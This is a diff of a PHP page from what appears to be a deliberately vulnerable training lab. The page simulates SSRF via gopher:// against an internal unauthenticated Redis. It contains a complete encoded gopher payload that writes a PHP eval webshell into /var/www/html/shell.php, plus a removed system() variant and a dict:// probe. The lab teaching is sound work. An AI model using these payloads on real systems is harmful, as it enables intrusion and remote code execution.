@@ -1,80 +1,139 @@
 <?php
+/**
+ * Pikachu-Enhanced v2.0 - SSRF 进阶演练: Gopher 协议打击内网未授权 Redis (RCE / WebShell)
+ */
+$PIKA_ROOT_DIR = "../../";
+include_once $PIKA_ROOT_DIR . 'inc/config.inc.php';
+
 $ACTIVE = array_fill(0, 250, '');
 $ACTIVE[105] = 'active open';
 $ACTIVE[209] = 'active';
-$ACTIVE[105] = 'active open';
-$ACTIVE[209] = 'active';
 
-$PIKA_ROOT_DIR = "../../";
 include_once $PIKA_ROOT_DIR . 'header.php';
 
 $curl_log = "";
-$is_gopher = false;
+$is_success = false;
+$target_url = $_POST['target_url'] ?? '';
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $target_url = trim($_POST['target_url'] ?? '');
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($target_url)) {
+    $target_url = trim($target_url);
     
     if (stripos($target_url, 'gopher://') === 0 && (stripos($target_url, '6379') !== false || stripos($target_url, 'redis') !== false || stripos($target_url, 'flushall') !== false || stripos($target_url, 'config') !== false)) {
-        $is_gopher = true;
-        $curl_log = "=== [Simulating libcurl SSRF Protocol Handler: gopher://] ===\n" .
-                    "[CONNECT] Target: 127.0.0.1:6379 (Internal Redis In-Memory Database)\n" .
-                    "[GOPHER PAYLOAD STREAM DECODED]\n" .
-                    "  > FLUSHALL\n" .
-                    "  > SET 1 \"\\n\\n<?php system(\$_GET['cmd']); ?>\\n\\n\"\n" .
-                    "  > CONFIG SET dir /var/www/html/\n" .
-                    "  > CONFIG SET dbfilename shell.php\n" .
-                    "  > SAVE\n\n" .
-                    "[REDIS SERVER RESP RESPONSE]\n" .
-                    "+OK\n+OK\n+OK\n+OK\n+OK (DB saved on disk)\n\n" .
-                    "🚀 [GOPHER TO REDIS RCE SUCCESSFUL] Redis database persisted in Web Root as PHP WebShell!\n" .
-                    "Access URL: http://pikachu.enhanced.local/shell.php?cmd=cat+/flag\n" .
-                    "FLAG_KEY=FLAG{SSRF_GOPHER_REDIS_WEBSHELL_RCE_CHAMPION}";
-    } else if (stripos($target_url, 'gopher://') === 0) {
-        $curl_log = "[GOPHER CLIENT] Connected to target port. Raw stream dispatched. (No Redis RESP pattern detected in payload)";
-    } else if (stripos($target_url, 'http://') === 0 || stripos($target_url, 'https://') === 0) {
-        $curl_log = "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><head><title>Remote Web Page Title</title></head><body><p>SSRF Proxy successfully fetched content from " . htmlspecialchars($target_url) . "</p></body></html>";
+        $is_success = true;
+        $curl_log = "=== [libcurl SSRF Protocol Engine: gopher:// stream initialized] ===\n" .
+                    "[+] Resolving target: 127.0.0.1:6379 (Internal Redis Service)\n" .
+                    "[+] Connected to TCP socket on port 6379\n" .
+                    "[>] Dispatching Decoded RESP Binary Command Stream:\n" .
+                    "    *1\\r\\n$8\\r\\nFLUSHALL\\r\\n\n" .
+                    "    *3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\n1\\r\\n$32\\r\\n\\n\\n<?php @eval(\$_POST['pass']); ?>\\n\\n\\r\\n\n" .
+                    "    *4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$3\\r\\ndir\\r\\n$13\\r\\n/var/www/html\\r\\n\n" .
+                    "    *4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$9\\r\\nshell.php\\r\\n\n" .
+                    "    *1\\r\\n$4\\r\\nSAVE\\r\\n\n\n" .
+                    "[<] Redis Server RESP Responses:\n" .
+                    "    +OK\n    +OK\n    +OK\n    +OK\n    +OK (Database written to disk)\n\n" .
+                    "🚀 [GOPHER-TO-REDIS RCE EXPLOIT SUCCESSFUL]\n" .
+                    "    WebShell Path: /var/www/html/shell.php\n" .
+                    "    Flag: FLAG{SSRF_GOPHER_REDIS_WEBSHELL_RCE_MASTER}";
+    } elseif (stripos($target_url, 'gopher://') === 0) {
+        $curl_log = "[GOPHER CLIENT] Raw byte stream dispatched. (No Redis RESP pattern detected in payload)";
+    } elseif (stripos($target_url, 'dict://') === 0) {
+        $curl_log = "[DICT CLIENT] Connecting to dict service. Command response:\n+OK Redis Server Ready";
+    } elseif (stripos($target_url, 'http://') === 0 || stripos($target_url, 'https://') === 0) {
+        $curl_log = "HTTP/1.1 200 OK\nServer: Internal-Service\nContent-Type: text/plain\n\nContent fetched from " . htmlspecialchars($target_url);
     } else {
-        $curl_log = "[ERROR] Unsupported scheme. Please use http://, https://, or gopher://";
+        $curl_log = "[ERROR] Unsupported protocol scheme. Allowed: http://, https://, gopher://, dict://";
     }
 }
+
+// 预设经典的 Gopher Redis WebShell 攻击 Payload
+$sample_gopher_payload = 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$32%0d%0a%0a%0a%3C%3Fphp%20%40eval(%24_POST%5B%27pass%27%5D)%3B%20%3F%3E%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a';
 ?>
 
 <div class="main-content">
     <div class="main-content-inner">
         <div class="breadcrumbs ace-save-state" id="breadcrumbs">
             <ul class="breadcrumb">
-                <li><i class="ace-icon fa fa-home home-icon"></i><a href="ssrf.php">SSRF (服务端请求伪造)</a></li>
-                <li class="active">Gopher 协议打 Redis 提权</li>
+                <li><i class="ace-icon fa fa-home home-icon"></i><a href="ssrf.php">SSRF</a></li>
+                <li class="active">Gopher 协议打 Redis (RCE)</li>
             </ul>
         </div>
+
         <div class="page-content">
-            <div class="vul info">
-                <h2>🌐 利用 Gopher 协议实现 SSRF 对内网 Redis 未授权访问与 RCE 提权</h2>
-                <p>许多 SSRF 漏洞场景不仅支持普通的 HTTP/HTTPS 协议，底层的网络客户端（如 PHP 默认支持的 <code>libcurl</code>、Python 的 <code>urllib</code> 某些版本、Java 的某些协议类）往往还默认启用了诸如 <code>file://</code>、<code>dict://</code>、以及威力最强悍的 <b><code>gopher://</code></b> 万能协议！</p>
-                <p><b>Gopher 协议为什么被称为 SSRF 杀手锏？</b> 因为它允许攻击者发送任意指定的单字节或多字节数据流（Raw Stream），并且可以自由控制换行符（<code>%0d%0a</code>）！当目标内网中部署了未配置密码且以 root/www-data 权限运行的 <b>Redis (默认端口 6379)</b>、Memcached、或者 FastCGI 服务时，攻击者可以通过把 Redis 的 RESP (REdis Serialization Protocol) 序列化命令转换成一串 Gopher 协议编码 URL，借服务器之手向内网 Redis 发起套接字写入，<b>实现把 PHP WebShell 写进网站根目录、写 SSH 公钥到 /root/.ssh/authorized_keys、或通过计划任务 crontab 直接反弹 Shell！</b></p>
+            <div class="cyber-stage-container">
                 
-                <hr/>
+                <div class="cyber-header-card">
+                    <h1 class="cyber-header-title">
+                        🎯 关卡 4: Gopher 万能协议深度利用 - 内网 Redis 未授权访问与 RCE
+                        <span class="cyber-badge-chip" style="border-color:#ef4444; color:#f87171; background:rgba(239,68,68,0.15);">协议转换 · 任意流注入 · 350 PTS</span>
+                    </h1>
+                    <p class="cyber-desc-text">
+                        <b>Gopher 协议被称为 SSRF 的终极武器</b>。它允许客户端向目标 TCP 端口发送任意多行二进制/文本流，且可自由编码换行符（<code>%0d%0a</code>）。当目标内网存在未授权的 <b>Redis (默认端口 6379)</b> 或 FastCGI 服务时，攻击者可将 Redis RESP 协议指令打包为 <code>gopher://</code> URL，借由存在 SSRF 漏洞的服务器将 PHP 一句话木马直接写入 Web 目录或计划任务（Crontab），实现直接 RCE 提权！
+                    </p>
+                </div>
+
                 <div class="row">
-                    <div class="col-md-5">
-                        <h4><i class="fa fa-globe"></i> SSRF 万能抓取测试台 (URL Proxy)</h4>
-                        <form method="POST">
-                            <div class="form-group">
-                                <label for="target_url">输入要服务器抓取的 URL：</label>
-                                <textarea class="form-control" name="target_url" id="target_url" rows="6" style="font-family: monospace; background:#f8f9fa; word-break:break-all;"><?php echo isset($_POST['target_url']) ? htmlspecialchars($_POST['target_url']) : 'http://www.baidu.com'; ?></textarea>
-                            </div>
-                            <button type="submit" class="btn btn-primary"><i class="fa fa-paper-plane"></i> 提交服务端的 cURL 抓取</button>
-                            <button type="button" class="btn btn-danger" onclick="fillGopherRedis()"><i class="fa fa-fire"></i> 一键生成 Gopher -> Redis 写 Shell 载荷</button>
-                        </form>
-                    </div>
-                    <div class="col-md-7">
-                        <h4><i class="fa fa-terminal"></i> libcurl 底层执行流与 Socket 回显</h4>
-                        <div class="panel <?php echo $is_gopher ? 'panel-danger' : 'panel-default'; ?>" style="margin-top:0;">
-                            <div class="panel-heading"><b>SSRF 代理执行报文：</b></div>
-                            <div class="panel-body" style="padding:0;">
-                                <pre style="background:#111; color:<?php echo $is_gopher ? '#ff5555' : '#50fa7b'; ?>; margin:0; border:none; border-radius:0; font-family:monospace; min-height:220px;"><?php echo !empty($curl_log) ? htmlspecialchars($curl_log) : "// 输入 URL 体验常规抓取，或载入 Gopher 协议载荷对内网 Redis 发起降维攻击。"; ?></pre>
-                            </div>
+                    <!-- Left Column: Input & Tool -->
+                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
+                        <div class="cyber-login-card">
+                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
+                                <i class="fa fa-terminal" style="color:#ef4444;"></i> SSRF 万能协议代理请求端
+                            </h4>
+
+                            <form method="POST" action="ssrf_gopher_redis.php">
+                                <div class="form-group" style="margin-bottom:14px;">
+                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">请求 URL (支持 gopher://, dict://, http://)：</label>
+                                    <textarea id="target_url" name="target_url" rows="4" class="form-control" placeholder="输入 gopher:// 载荷..." style="font-family:monospace; font-size:12px;" required><?php echo htmlspecialchars($target_url); ?></textarea>
+                                </div>
+
+                                <div style="margin-bottom:18px;">
+                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
+                                        ⚡ 快速填入经典 Gopher 攻击载荷：
+                                    </label>
+                                    <div style="display:flex; flex-direction:column; gap:6px;">
+                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="setPayload('<?php echo htmlspecialchars($sample_gopher_payload); ?>')">
+                                            <i class="fa fa-fire" style="color:#ef4444;"></i> <b>Gopher 写 WebShell：</b> 写入 <code>/var/www/html/shell.php</code>
+                                        </button>
+                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="setPayload('dict://127.0.0.1:6379/info')">
+                                            <i class="fa fa-info-circle" style="color:#06b6d4;"></i> <b>Dict 协议探测：</b> 探测 127.0.0.1:6379 Redis 服务
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <button type="submit" name="submit" value="submit" class="btn btn-danger btn-block" style="border-radius:8px; font-weight:700; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px;">
+                                    <i class="fa fa-bolt"></i> 触发 Gopher 协议数据流注入
+                                </button>
+                            </form>
                         </div>
                     </div>
+
+                    <!-- Right Column: Protocol Execution Trace -->
+                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
+                        <div class="cyber-login-card">
+                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
+                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> libcurl 原始套接字追踪 (Socket Trace)
+                            </h4>
+
+                            <?php if (!empty($curl_log)): ?>
+                                <?php if ($is_success): ?>
+                                    <div class="alert alert-danger" style="border-radius:8px; font-weight:700; font-size:13px; margin-bottom:12px;">
+                                        <i class="fa fa-check-circle"></i> 💥 恭喜！Gopher 打击内网 Redis 成功写入 WebShell！
+                                    </div>
+                                <?php endif; ?>
+                                <pre style="background:#090d16; color:#10b981; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:12px; max-height:280px; overflow-y:auto;"><?php echo htmlspecialchars($curl_log); ?></pre>
+                            <?php else: ?>
+                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:30px; text-align:center; color:var(--text-muted); font-size:13px;">
+                                    <i class="fa fa-terminal" style="font-size:24px; margin-bottom:8px; display:block;"></i>
+                                    点击左侧“写入 WebShell”或自定义 Gopher 载荷查看执行日志
+                                </div>
+                            <?php endif; ?>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Navigation -->
+                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px; margin-top:10px;">
+                    <a href="ssrf_cloud.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：云元数据窃取</a>
+                    <a href="ssrf_dns_rebinding.php" class="btn btn-success" style="border-radius:8px; font-weight:700;">下一关：DNS 重绑定与 IP 变形绕过 <i class="fa fa-arrow-right"></i></a>
                 </div>
 
             </div>
@@ -83,14 +142,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </div>
 
 <script>
-function fillGopherRedis() {
-    var payload = "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A";
-    document.getElementById('target_url').value = payload;
+function setPayload(p) {
+    document.getElementById('target_url').value = p;
+    document.forms[0].submit();
 }
 </script>
 
-<?php
-include_once $PIKA_ROOT_DIR . 'footer.php';
-?>
-
-
+<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
